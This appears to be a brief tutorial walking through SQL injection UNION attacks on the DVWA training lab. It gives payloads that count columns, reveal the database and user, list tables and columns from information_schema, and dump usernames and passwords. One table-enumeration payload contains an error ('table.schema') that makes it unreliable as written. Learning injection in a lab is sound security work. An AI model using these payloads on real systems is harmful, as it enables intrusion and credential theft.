# SQL injection UNION attacks
 The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:
```sh
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
## Steps for Number of columns required in an SQL injection UNION attack 
```sh
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#
```
if exceeds the database returns an error
```sh
Unknown column '3' in 'order clause'
```
After Knowing the Columns present in the data 
 * Next step to find the Database and the user present.
```sh
' UNION SELECT database(),user()#
```
You will get the screen below:

![final1](https://github.com/rahulrbk/Docs/blob/master/pic.png)

* After Knowing the database name and the user name we will find 'TABLE' inside the database.
with the following query:

```sh
' UNION SELECT table_name,table_name FROM information_schema.tables WHERE table.schema="dvwadb"#
``` 

![final2](https://github.com/rahulrbk/Docs/blob/master/pic2.png)
* Now we have to find the information about Column data present in the table with the following query:

```sh
' UNION SELECT column_name,column_name FROM information_schema.columns WHERE table_schema="dvwadb"#
```
![final3](https://github.com/rahulrbk/Docs/blob/master/pic3.png)
* At this point we can search for the critical information of the target by mentioning the following query:

```sh
'UNION SELECT user,password FROM users#
```

![final4](https://github.com/rahulrbk/Docs/blob/master/pic4.png)




